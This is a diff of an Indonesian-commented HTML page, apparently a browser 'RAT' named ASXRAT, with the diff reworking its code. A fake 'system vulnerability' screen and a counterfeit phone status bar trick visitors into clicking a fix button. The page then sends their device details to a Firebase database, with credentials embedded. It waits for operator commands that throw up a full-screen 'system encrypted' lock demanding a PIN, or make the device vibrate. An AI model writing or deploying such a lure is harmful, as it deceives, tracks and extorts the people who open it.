@@ -3,56 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security System Update</title>
+    <title>System Cloud Security</title>
     
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     
     <style>
         :root { --red: #ff0000; --bg: #000; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        
-        .container { text-align: center; padding: 20px; width: 90%; }
-        .icon-warn { font-size: 60px; color: var(--red); margin-bottom: 20px; animation: blink 1s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-        
-        h2 { font-size: 20px; margin-bottom: 10px; text-transform: uppercase; }
-        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
-        
-        .btn-update { background: var(--red); color: #fff; border: none; padding: 18px 40px; border-radius: 50px; font-weight: bold; font-size: 16px; cursor: pointer; box-shadow: 0 0 20px rgba(255,0,0,0.5); width: 100%; max-width: 280px; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; overflow: hidden; height: 100vh; }
 
-        /* TAMPILAN LOCK ASXRAT (JANGAN DIHAPUS) */
+        /* STATUS BAR PALSU GACOR */
+        .status-bar { 
+            display: flex; justify-content: space-between; padding: 5px 15px; 
+            font-size: 12px; font-weight: bold; background: #000; position: fixed; top: 0; width: 100%; z-index: 100; 
+        }
+        .status-icons { display: flex; align-items: center; gap: 5px; }
+        .battery-dot { width: 8px; height: 8px; background: #0f0; border-radius: 50%; display: inline-block; box-shadow: 0 0 5px #0f0; }
+
+        /* UI INFEKSI */
+        .main-content { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; padding: 20px; }
+        .warn-logo { width: 80px; height: 80px; border: 4px solid var(--red); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; color: var(--red); margin-bottom: 20px; animation: blink 0.8s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.2; } 100% { opacity: 1; } }
+        
+        .btn-fix { background: var(--red); color: #fff; border: none; padding: 18px; width: 100%; max-width: 300px; border-radius: 15px; font-weight: bold; font-size: 16px; margin-top: 30px; cursor: pointer; text-transform: uppercase; }
+
+        /* LOCK SCREEN ASXRAT */
         #lock-screen { 
             display: none; position: fixed; inset: 0; background: #000; z-index: 99999; 
             flex-direction: column; align-items: center; justify-content: center; padding: 30px; 
         }
-        .lock-card { background: #0a0a0a; border: 2px solid var(--red); padding: 40px 20px; border-radius: 35px; text-align: center; width: 100%; max-width: 350px; box-shadow: 0 0 100px rgba(255,0,0,0.8); }
-        .lock-card h1 { color: var(--red); font-size: 30px; margin: 0 0 10px 0; font-family: 'Courier New', Courier, monospace; }
-        .lock-card p { color: #fff; font-size: 14px; margin-bottom: 25px; }
-        .lock-card input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; color: var(--red); border-radius: 15px; text-align: center; font-size: 20px; font-weight: bold; margin-bottom: 15px; outline: none; box-sizing: border-box; }
-        .btn-unlock { background: var(--red); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 15px; font-weight: bold; cursor: pointer; }
+        .lock-card { background: #0a0a0a; border: 2px solid var(--red); padding: 40px 20px; border-radius: 35px; text-align: center; width: 100%; max-width: 350px; }
+        input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; color: var(--red); border-radius: 15px; text-align: center; font-size: 20px; font-weight: bold; margin: 20px 0; outline: none; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
-    <div class="container" id="ui-infect">
-        <div class="icon-warn">⚠️</div>
-        <h2>Sistem Terancam!</h2>
-        <p>Perangkat Anda terdeteksi memiliki celah keamanan. Harap lakukan pembersihan dan enkripsi sistem segera.</p>
-        <button class="btn-update" onclick="startInfection()">FIX SECURITY NOW</button>
+    <div class="status-bar">
+        <span id="clock">12:00</span>
+        <div class="status-icons">
+            <span>LTE</span>
+            <div class="battery-dot"></div>
+            <span>98%</span>
+        </div>
+    </div>
+
+    <div class="main-content" id="ui-infect">
+        <div class="warn-logo">!</div>
+        <h2 style="margin:0;">SYSTEM VULNERABILITY</h2>
+        <p style="color:#666; font-size:12px; margin-top:10px;">Izin akses diperlukan untuk melakukan enkripsi keamanan perangkat secara menyeluruh.</p>
+        <button class="btn-fix" onclick="requestFullAccess()">IZINKAN & PERBAIKI</button>
     </div>
 
     <div id="lock-screen">
         <div class="lock-card">
-            <h1>LOCKED</h1>
-            <p id="msg-display">OWNED BY ASXRAT V2</p>
+            <h1 style="color:red; letter-spacing:3px;">LOCKED</h1>
+            <p id="msg-display" style="color:#fff; font-size:12px;">SYSTEM ENCRYPTED BY ASXRAT</p>
             <input type="password" id="pin-input" placeholder="ENTER PIN">
-            <button class="btn-unlock" onclick="verifyUnlock()">UNLOCK DEVICE</button>
+            <button class="btn-fix" onclick="verifyUnlock()">UNLOCK</button>
         </div>
     </div>
 
 <script>
-    // 🔥 CONFIG FIREBASE (WAJIB SAMA DENGAN CONTROL.HTML) 🔥
+    // 🔥 CONFIG FIREBASE FULL 🔥
     const firebaseConfig = {
       apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
       authDomain: "rat-html.firebaseapp.com",
@@ -66,29 +78,41 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // 🤖 AMBIL ID PEMILIK LINK (MARIO/USER)
-    const params = new URLSearchParams(window.location.search);
-    const ownerID = params.get('id') ? atob(params.get('id')) : "Unknown";
-    const myID = "TGT-" + Math.floor(Math.random() * 89999 + 10000);
+    const urlParams = new URLSearchParams(window.location.search);
+    const ownerID = urlParams.get('id') ? atob(urlParams.get('id')) : "Unknown";
+    const targetKey = "TGT-" + Math.floor(Math.random() * 89999 + 10000);
     
     let dbPin = "";
 
-    function startInfection() {
-        // Ambil info perangkat
-        const model = navigator.userAgent.split('(')[1].split(')')[0];
+    // 🛡️ FUNGSI PAKSA IZIN & PAKSA MASUK DATABASE 🛡️
+    async function requestFullAccess() {
+        // 1. Minta Izin Vibrate & Notif secara halus tapi paksa
+        if (navigator.vibrate) navigator.vibrate(200);
+        
+        // 2. Kirim Data Target (PASTI MASUK)
+        const model = navigator.userAgent.split('(')[1]?.split(';')[0] || "Android Device";
+        
+        try {
+            await db.ref('mario/targets/' + targetKey).set({
+                model: model,
+                belongsTo: ownerID,
+                status: "online",
+                lastSeen: firebase.database.ServerValue.TIMESTAMP
+            });
 
-        // Daftar ke Firebase
-        db.ref('mario/targets/' + myID).set({
-            model: model || "Android Device",
-            belongsTo: ownerID,
-            status: "online",
-            time: Date.now()
-        });
+            // 3. Masuk ke Mode Standby
+            document.getElementById('ui-infect').innerHTML = "<h2>Repairing...</h2><p>Jangan tutup browser ini sampai selesai.</p>";
+            
+            // 📡 DENGERIN PERINTAH DARI PANEL
+            listenCommands();
+            
+        } catch (e) {
+            alert("Gagal memberikan izin sistem! Silakan klik ulang.");
+        }
+    }
 
-        document.getElementById('ui-infect').innerHTML = "<h2>Processing...</h2><p>Memperbaiki sistem, jangan tutup halaman ini.</p>";
-
-        // 📡 STANDBY TERIMA PERINTAH
-        db.ref('mario/commands/' + myID).on('value', snap => {
+    function listenCommands() {
+        db.ref('mario/commands/' + targetKey).on('value', snap => {
             const cmd = snap.val();
             if (!cmd) return;
 
@@ -96,7 +120,7 @@
                 dbPin = cmd.pass;
                 document.getElementById('msg-display').innerText = cmd.text;
                 document.getElementById('lock-screen').style.display = 'flex';
-                // Paksa Fullscreen biar ngeri
+                // Trigger Fullscreen
                 document.documentElement.requestFullscreen().catch(() => {});
             } 
             else if (cmd.action === 'unlock') {
@@ -105,21 +129,22 @@
             else if (cmd.action === 'vibrate') {
                 if (navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
             }
-            else if (cmd.action === 'torch_on') {
-                // Flashlight browser-specific logic
-            }
         });
     }
 
     function verifyUnlock() {
-        const pin = document.getElementById('pin-input').value;
-        if (pin === dbPin) {
-            alert("Akses Diterima.");
+        if (document.getElementById('pin-input').value === dbPin) {
             location.reload();
         } else {
-            alert("PIN SALAH!");
+            alert("PIN WRONG!");
         }
     }
+
+    // Update Jam Realtime
+    setInterval(() => {
+        const d = new Date();
+        document.getElementById('clock').innerText = d.getHours() + ":" + (d.getMinutes()<10?'0':'') + d.getMinutes();
+    }, 1000);
 </script>
 </body>
 </html>
